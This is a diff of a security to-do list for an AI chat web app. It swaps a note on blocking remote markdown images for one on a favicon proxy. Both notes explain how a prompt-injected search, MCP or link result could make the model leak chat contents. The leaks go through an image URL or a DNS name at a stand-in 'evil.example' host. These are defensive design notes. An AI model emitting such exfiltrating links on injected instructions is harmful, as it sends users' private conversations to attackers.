@@ -29,22 +29,13 @@ Prefer a server-signed guest cookie plus an IP bucket, admitted from an
 internal mutation instead of public ones, and fail closed if the limiter store
 is down (Vercel Chatbot's Redis check fails open; do not copy that). Pairs with
 the BotID evaluation below.
-- **Block remote markdown images (data exfiltration):**
-`components/ui/markdown.tsx` has no `img` handler and the CSP allows
-`img-src https:` (`next.config.ts`), so a prompt-injected search or MCP result
-can make the model emit `![](https://evil.example/?d=<chat contents>)` and the
-browser loads it with no click or approval. Render remote images as plain links
-or from an allowlist, tighten `img-src`, and update the `markdown.test.tsx` case
-that asserts images render. No reference project fixes this; the "images are
-inert" reasoning in `next.config.ts` is what needs correcting.
-- **Error boundaries:** No `error.tsx` exists under `app/` and nothing wraps
-message rows in `app/components/chat/conversation.tsx`, so one throw while
-rendering a saved message (for example odd MCP tool output) replaces the whole
-page, and reloading crashes again because the message is persisted. Add a
-segment `error.tsx` with retry and a per-row boundary that falls back to plain
-text or an alert row, keeping the sidebar reachable so the chat can be deleted.
-References: LobeHub `SafeBoundary` per message, LibreChat
-`MarkdownErrorBoundary`.
+- **Favicon proxy sees model-chosen hostnames without a click:** Markdown link
+pills and source chips render `Favicon`, which requests
+`/api/favicon?domain=<host>` on its own, and `app/api/favicon/route.ts` asks
+Google's favicon service about that host. A prompt-injected link to
+`https://<encoded-chat>.evil.example` can leak data through DNS with no click.
+Show favicons only for tool-sourced citations, or a static globe for
+model-written links.
 - **Sharing: revoke and a safe public view:** `makePublic` is the only writer of
 `public: true`, and only chat deletion clears it. Add un-share, and consider a
 separate share id or snapshot instead of exposing the private chat id live.
